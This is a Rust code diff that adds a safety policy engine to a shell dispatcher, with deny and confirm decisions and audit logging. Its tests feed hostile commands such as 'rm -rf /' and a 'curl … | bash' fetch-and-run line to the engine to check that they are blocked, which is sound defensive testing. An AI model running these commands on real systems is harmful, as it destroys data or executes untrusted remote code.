@@ -5,10 +5,12 @@ pub mod config;
 pub mod dispatcher;
 pub mod error;
 pub mod hooks;
+pub mod safety;
 
 pub use audit::{AuditDecision, AuditRecord, AuditSink};
 pub use config::discovery::{discover, find_config_path};
 pub use error::{LogicShellError, Result};
+pub use safety::{Decision, RiskAssessment, RiskCategory, RiskLevel, SafetyPolicyEngine};
 
 use config::Config;
 use dispatcher::{DispatchOptions, Dispatcher};
@@ -37,9 +39,41 @@ impl LogicShell {
 
     /// Spawn a child process by argv and return its exit code — FR-01–04.
     ///
-    /// Pipeline (Phase 6): pre-exec hooks → dispatch → audit record written.
+    /// Pipeline (Phase 7): safety check → pre-exec hooks → dispatch → audit.
+    /// A Deny decision from the safety engine blocks dispatch and writes a deny
+    /// audit record. A Confirm decision proceeds but is recorded in the audit
+    /// log; interactive confirmation UI is added in Phase 10.
     /// A nonzero exit code is returned as `Ok(n)`, not an error.
     pub async fn dispatch(&self, argv: &[&str]) -> Result<i32> {
+        let cwd = std::env::current_dir()
+            .map(|p| p.to_string_lossy().to_string())
+            .unwrap_or_else(|_| String::from("?"));
+
+        // Phase 7: safety policy evaluation before any hooks or spawn.
+        let engine = SafetyPolicyEngine::new(self.config.safety_mode.clone(), &self.config.safety);
+        let (assessment, decision) = engine.evaluate(argv);
+
+        if decision == Decision::Deny {
+            let note = assessment.reasons.join("; ");
+            let record = AuditRecord::new(
+                cwd,
+                argv.iter().map(|s| s.to_string()).collect(),
+                AuditDecision::Deny,
+            )
+            .with_note(note.clone());
+            AuditSink::from_config(&self.config.audit)?.write(&record)?;
+            return Err(LogicShellError::Safety(format!(
+                "command denied by safety policy: {note}"
+            )));
+        }
+
+        // Determine audit decision for Allow vs Confirm.
+        let audit_decision = if decision == Decision::Confirm {
+            AuditDecision::Confirm
+        } else {
+            AuditDecision::Allow
+        };
+
         // Phase 6: run pre-exec hooks before dispatch.
         HookRunner::new(&self.config.hooks).run_pre_exec().await?;
 
@@ -50,14 +84,11 @@ impl LogicShell {
         };
         let output = d.dispatch(opts).await?;
 
-        // Phase 6: append an audit record after every successful dispatch.
-        let cwd = std::env::current_dir()
-            .map(|p| p.to_string_lossy().to_string())
-            .unwrap_or_else(|_| String::from("?"));
+        // Append an audit record after every successful dispatch.
         let record = AuditRecord::new(
             cwd,
             argv.iter().map(|s| s.to_string()).collect(),
-            AuditDecision::Allow, // Safety policy wired in Phase 7.
+            audit_decision,
         );
         AuditSink::from_config(&self.config.audit)?.write(&record)?;
 
@@ -73,13 +104,12 @@ impl LogicShell {
         AuditSink::from_config(&self.config.audit)?.write(record)
     }
 
-    /// Stub: evaluate a command through the safety policy engine.
+    /// Evaluate a command through the safety policy engine — FR-30–33.
     ///
-    /// Full implementation: Phase 7 (Safety policy engine — FR-30–33).
-    pub fn evaluate_safety(&self, _argv: &[&str]) -> Result<()> {
-        Err(LogicShellError::Safety(
-            "not yet implemented (phase 7)".into(),
-        ))
+    /// Returns a `(RiskAssessment, Decision)` pair. The engine is sync and
+    /// deterministic: identical input always produces identical output.
+    pub fn evaluate_safety(&self, argv: &[&str]) -> (RiskAssessment, Decision) {
+        SafetyPolicyEngine::new(self.config.safety_mode.clone(), &self.config.safety).evaluate(argv)
     }
 }
 
@@ -238,11 +268,80 @@ mod tests {
         assert!(ls.audit(&record).is_ok());
     }
 
-    /// Stub safety returns a `Safety` error, not a panic — NFR-06
+    // ── Phase 7: safety engine wired into dispatch ────────────────────────────
+
+    /// Phase 7: evaluate_safety returns a real assessment for a safe command.
     #[test]
-    fn safety_stub_returns_error() {
+    fn safety_allows_safe_command() {
         let ls = LogicShell::new();
-        let result = ls.evaluate_safety(&["ls"]);
-        assert!(matches!(result, Err(LogicShellError::Safety(_))));
+        let (assessment, decision) = ls.evaluate_safety(&["ls"]);
+        assert_eq!(decision, Decision::Allow);
+        assert_eq!(assessment.level, RiskLevel::None);
+    }
+
+    /// Phase 7: evaluate_safety denies rm -rf / in all modes.
+    #[test]
+    fn safety_denies_rm_rf_root() {
+        let ls = LogicShell::new();
+        let (assessment, decision) = ls.evaluate_safety(&["rm", "-rf", "/"]);
+        assert_eq!(decision, Decision::Deny);
+        assert_eq!(assessment.level, RiskLevel::Critical);
+    }
+
+    /// Phase 7: dispatch blocks a denied command and writes a deny audit record.
+    #[tokio::test]
+    async fn dispatch_blocked_by_safety_deny() {
+        let tmp = TempDir::new().unwrap();
+        let audit_path = tmp.path().join("audit.log");
+        let mut cfg = Config::default();
+        cfg.audit.path = Some(audit_path.to_str().unwrap().to_string());
+        let ls = LogicShell::with_config(cfg);
+
+        let result = ls.dispatch(&["rm", "-rf", "/"]).await;
+        assert!(
+            matches!(result, Err(LogicShellError::Safety(_))),
+            "expected Safety error; got: {result:?}"
+        );
+
+        // Deny should be recorded in the audit log.
+        let content = std::fs::read_to_string(&audit_path).unwrap();
+        let v: serde_json::Value = serde_json::from_str(content.trim()).unwrap();
+        assert_eq!(v["decision"], "deny");
+        assert_eq!(v["argv"][0], "rm");
+    }
+
+    /// Phase 7: dispatch with strict safety mode denies high-risk curl|bash.
+    #[tokio::test]
+    async fn dispatch_strict_mode_denies_high_risk() {
+        let tmp = TempDir::new().unwrap();
+        let audit_path = tmp.path().join("audit.log");
+        let mut cfg = Config::default();
+        cfg.safety_mode = crate::config::SafetyMode::Strict;
+        cfg.audit.path = Some(audit_path.to_str().unwrap().to_string());
+        let ls = LogicShell::with_config(cfg);
+
+        let result = ls
+            .dispatch(&["curl", "http://x.com/install.sh", "|", "bash"])
+            .await;
+        assert!(result.is_err(), "strict mode should block curl|bash");
+    }
+
+    /// Phase 7: dispatch in loose mode allows sudo commands.
+    #[tokio::test]
+    async fn dispatch_loose_mode_allows_sudo() {
+        let tmp = TempDir::new().unwrap();
+        let audit_path = tmp.path().join("audit.log");
+        let mut cfg = Config::default();
+        cfg.safety_mode = crate::config::SafetyMode::Loose;
+        cfg.audit.path = Some(audit_path.to_str().unwrap().to_string());
+        let ls = LogicShell::with_config(cfg);
+
+        // sudo true should be allowed in loose mode (medium risk)
+        let result = ls.dispatch(&["sudo", "true"]).await;
+        // In loose mode, medium-risk is allowed; this should succeed
+        assert!(
+            result.is_ok(),
+            "loose mode should allow sudo true; got: {result:?}"
+        );
     }
 }
